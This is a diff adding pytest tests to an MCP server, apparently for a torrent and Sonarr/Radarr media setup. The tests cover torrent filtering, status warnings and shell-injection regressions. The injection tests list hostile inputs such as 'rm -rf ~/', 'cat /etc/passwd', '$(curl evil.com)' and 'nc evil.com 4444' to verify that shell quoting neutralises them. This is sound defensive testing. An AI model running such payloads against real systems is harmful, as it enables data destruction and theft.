@@ -51,6 +51,86 @@ def test_list_torrents_returns_torrents(tmp_path, monkeypatch):
     assert out[0]["hash"] == "a"
 
 
+def test_list_torrents_filters_by_state(tmp_path, monkeypatch):
+    monkeypatch.setattr(qflix_mcp, "DATA_ROOT", tmp_path)
+    _seed_snapshot(tmp_path, 1, {
+        "captured_at": "2026-05-12T01:00:00Z",
+        "qbit": {"torrents": [
+            {"hash": "a", "state": "downloading"},
+            {"hash": "b", "state": "stalledDL"},
+            {"hash": "c", "state": "stalledDL"},
+        ]},
+    })
+    out = qflix_mcp.qflix_list_torrents(state="stalledDL")
+    assert {t["hash"] for t in out} == {"b", "c"}
+
+
+def test_list_torrents_filters_by_category(tmp_path, monkeypatch):
+    monkeypatch.setattr(qflix_mcp, "DATA_ROOT", tmp_path)
+    _seed_snapshot(tmp_path, 1, {
+        "captured_at": "2026-05-12T01:00:00Z",
+        "qbit": {"torrents": [
+            {"hash": "a", "category": "radarr"},
+            {"hash": "b", "category": "tv-sonarr"},
+        ]},
+    })
+    out = qflix_mcp.qflix_list_torrents(category="radarr")
+    assert [t["hash"] for t in out] == ["a"]
+
+
+def test_list_torrents_stale_only_filter(tmp_path, monkeypatch):
+    monkeypatch.setattr(qflix_mcp, "DATA_ROOT", tmp_path)
+    _seed_snapshot(tmp_path, 1, {
+        "captured_at": "2026-05-12T01:00:00Z",
+        "qbit": {"torrents": [{"hash": "a"}, {"hash": "b"}]},
+    })
+    (tmp_path / "stale-state.json").write_text(json.dumps({
+        "hashes": {
+            "a": {"candidate_for_unstick": True, "consecutive_zero_hours": 5},
+            "b": {"candidate_for_unstick": False},
+        },
+    }))
+    out = qflix_mcp.qflix_list_torrents(stale_only=True)
+    assert [t["hash"] for t in out] == ["a"]
+
+
+def test_status_emits_stale_warning_for_old_snapshot(tmp_path, monkeypatch):
+    monkeypatch.setattr(qflix_mcp, "DATA_ROOT", tmp_path)
+    _seed_snapshot(tmp_path, 1, {
+        # 10 hours old — way past the 90-min staleness threshold.
+        "captured_at": "1999-01-01T00:00:00Z",
+        "qbit": {"torrents": []},
+    })
+    out = qflix_mcp.qflix_status()
+    assert out["stale_warning"] is True
+    assert out["snapshot_age_minutes"] is not None
+    assert out["snapshot_age_minutes"] > 90 * 60  # decades old in minutes
+
+
+def test_status_surfaces_valid_arr_slugs(tmp_path, monkeypatch):
+    monkeypatch.setattr(qflix_mcp, "DATA_ROOT", tmp_path)
+    _seed_snapshot(tmp_path, 1, {
+        "captured_at": "2026-05-12T01:00:00Z",
+        "qbit": {"torrents": []},
+    })
+    out = qflix_mcp.qflix_status()
+    assert set(out["valid_arr_slugs"]) == {"sonarr", "sonarr2", "radarr", "radarr2"}
+
+
+def test_status_warns_on_partial_collect(tmp_path, monkeypatch):
+    monkeypatch.setattr(qflix_mcp, "DATA_ROOT", tmp_path)
+    _seed_snapshot(tmp_path, 1, {
+        "captured_at": "2026-05-12T01:00:00Z",
+        "qbit": {"torrents": []},
+    })
+    (tmp_path / "last-collect.json").write_text(json.dumps({
+        "exit_code": 1, "duration_s": 12.3,
+    }))
+    out = qflix_mcp.qflix_status()
+    assert "last_collect_warning" in out
+    assert "exited 1" in out["last_collect_warning"]
+
+
 def test_torrent_history_finds_hash(tmp_path, monkeypatch):
     monkeypatch.setattr(qflix_mcp, "DATA_ROOT", tmp_path)
     for h in (0, 1):
@@ -309,3 +389,86 @@ def test_query_logs_handles_ssh_timeout(mock_ssh):
     out = qflix_mcp.qflix_query_logs(query="*")
     assert out["status"] == "ssh-timeout"
     assert out["timeout_s"] == 15
+
+
+# ===== Shell-injection regression tests =================================
+# Every MCP→SSH tool that interpolates caller input must shlex.quote it so
+# embedded shell metacharacters can't break out of the command line.
+
+_INJECTION_PAYLOADS = [
+    "sonarr; rm -rf ~/",
+    'radarr"; cat /etc/passwd; #',
+    "sonarr$(curl evil.com)",
+    "`whoami`",
+    "foo && touch /tmp/pwn",
+    "x|nc evil.com 4444",
+]
+
+
+def _assert_no_unquoted_injection(cmd: str, payload: str) -> None:
+    """The raw payload must never appear in the command as an unquoted token.
+    shlex.quote wraps unsafe values in single quotes, so the payload appears
+    only inside a quoted string."""
+    # The dangerous metacharacters (;, |, &, $, `) when present in the payload
+    # must each be inside single quotes if they appear in the cmd.
+    for char in [";", "|", "&", "$", "`", "(", ")"]:
+        if char in payload and char in cmd:
+            # Locate every occurrence in cmd and confirm it's between single quotes.
+            # Crude but effective: count single quotes before the position; must be odd.
+            for i, c in enumerate(cmd):
+                if c == char:
+                    quotes_before = cmd.count("'", 0, i)
+                    assert quotes_before % 2 == 1, (
+                        f"unquoted {char!r} from payload {payload!r} in cmd: {cmd}"
+                    )
+
+
+@patch("qflix_mcp.ssh_call")
+def test_get_logs_shell_quotes_app(mock_ssh):
+    fake = MagicMock(); fake.returncode = 0; fake.stdout = "{}"; fake.stderr = ""
+    mock_ssh.return_value = fake
+    for payload in _INJECTION_PAYLOADS:
+        qflix_mcp.qflix_get_logs(app=payload, since="1h", tail=10)
+        cmd = mock_ssh.call_args[0][0]
+        _assert_no_unquoted_injection(cmd, payload)
+
+
+@patch("qflix_mcp.ssh_call")
+def test_get_logs_shell_quotes_since(mock_ssh):
+    fake = MagicMock(); fake.returncode = 0; fake.stdout = "{}"; fake.stderr = ""
+    mock_ssh.return_value = fake
+    for payload in _INJECTION_PAYLOADS:
+        qflix_mcp.qflix_get_logs(app="sonarr", since=payload, tail=10)
+        cmd = mock_ssh.call_args[0][0]
+        _assert_no_unquoted_injection(cmd, payload)
+
+
+@patch("qflix_mcp.ssh_call")
+def test_unstick_torrent_shell_quotes_all_user_strings(mock_ssh):
+    fake = MagicMock(); fake.returncode = 0
+    fake.stdout = '{"status": "deleted+blocklisted"}'; fake.stderr = ""
+    mock_ssh.return_value = fake
+    for payload in _INJECTION_PAYLOADS:
+        qflix_mcp.qflix_unstick_torrent(slug=payload, hash_=payload, reason=payload)
+        cmd = mock_ssh.call_args[0][0]
+        _assert_no_unquoted_injection(cmd, payload)
+
+
+@patch("qflix_mcp.ssh_call")
+def test_diagnose_unstick_shell_quotes(mock_ssh):
+    fake = MagicMock(); fake.returncode = 0; fake.stdout = "{}"; fake.stderr = ""
+    mock_ssh.return_value = fake
+    for payload in _INJECTION_PAYLOADS:
+        qflix_mcp.qflix_diagnose_unstick(slug=payload, hash_=payload)
+        cmd = mock_ssh.call_args[0][0]
+        _assert_no_unquoted_injection(cmd, payload)
+
+
+@patch("qflix_mcp.ssh_call")
+def test_trigger_missing_search_shell_quotes_slug(mock_ssh):
+    fake = MagicMock(); fake.returncode = 0; fake.stdout = "{}"; fake.stderr = ""
+    mock_ssh.return_value = fake
+    for payload in _INJECTION_PAYLOADS:
+        qflix_mcp.qflix_trigger_missing_search(slug=payload)
+        cmd = mock_ssh.call_args[0][0]
+        _assert_no_unquoted_injection(cmd, payload)
